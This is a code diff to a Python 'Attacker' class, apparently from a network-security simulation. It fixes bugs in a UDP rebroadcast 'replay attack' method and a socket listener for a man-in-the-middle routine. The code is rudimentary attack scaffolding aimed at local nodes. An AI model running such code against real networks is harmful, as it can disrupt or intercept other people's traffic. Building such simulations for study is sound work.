@@ -21,11 +21,11 @@ class Attacker:
         self.tcp_socket.connect((self.server_ip, self.server_port))
         self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
         
-    def generate_random_string(length):
+    def generate_random_string(self):
         # Choose from lowercase letters and digits
         characters = string.ascii_lowercase + string.digits
         # Generate a random string of the specified length
-        random_string = ''.join(random.choice(characters) for _ in range(length))
+        random_string = ''.join(random.choice(characters) for _ in range(134))
         return random_string   
                 
     def perform_replay_attack(self):
@@ -37,9 +37,10 @@ class Attacker:
             data, _ = sock.recvfrom(1024)
             message = data.decode()
             print(f"received message: {message}")
-            modified_message = self.generate_random_string(134)
+            modified_message = self.generate_random_string()
             time.sleep(5)
             sock.sendto(modified_message.encode(), ('<broadcast>', self.udp_port))
+            print(f"broadcast message: {modified_message}")
     
     def run_replay_attack(self):
         self.perform_replay_attack()
@@ -82,7 +83,7 @@ class Attacker:
     def start_mitm(self):
         # Create a socket to listen for incoming connections from nodes
         mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        mitm_socket.bind(MITM_IP, MITM_PORT)
+        mitm_socket.bind((MITM_IP, MITM_PORT))
         mitm_socket.listen(5)
         print(f"[*] Listening on {MITM_IP} : {MITM_PORT}")
 
